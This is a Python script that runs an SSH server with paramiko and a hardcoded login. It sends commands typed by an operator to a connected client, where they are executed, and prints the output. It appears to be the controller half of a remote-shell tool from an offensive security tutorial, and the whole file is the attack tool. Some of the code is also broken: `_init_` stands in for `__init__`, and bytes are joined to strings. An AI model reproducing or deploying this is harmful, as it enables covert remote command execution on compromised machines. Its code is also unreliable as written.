# import packages
import socket
import paramiko
import threading
import sys

# using the host_key from the paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key')

class Server(paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if username == 'anonymous' and password == 'claudia':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = int(sys.argv[2])

# starting a socket listener
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('Listening for connections...')

    client, addr = sock.accept()
except Exception as e:
    print('Listen failed' + str(e))
    sys.exit(1)
print('Got a connection')

# configuring the authentication methods
try:
    Session = paramiko.Transport(client)
    Session.add_server_key(host_key)
    server = Server()
    try:
        Session.start_server(server=server)
    except paramiko.SSHException as x:
        print('SSH negotiation failed')
    channel = Session.accept(20)
    print('Authenticated')

    print(channel.recv(1024))
    channel.send('Welcome to ssh')

    while True:
        try:
            command = input('Enter command-->').strip('\n')
            if command != 'exit':
                channel.send(command)
                print(channel.recv(1024) + '\n')
            else:
                channel.send('exit')
                print('Exiting')
                Session.close()
                raise Exception('Exit')
        except KeyboardInterrupt:
            Session.close()
except Exception as e:
    print('Caught Exception' + str(e))
    try:
        Session.close()
    except:
        pass
    sys.exit(1)

'''When a client has authenticated and sent us the ClientConnected
message , any command we type into the bh_sshserver is sent to the bh_sshclient and executed on the bh_sshclient, and the output is returned to bh_sshserver.'''
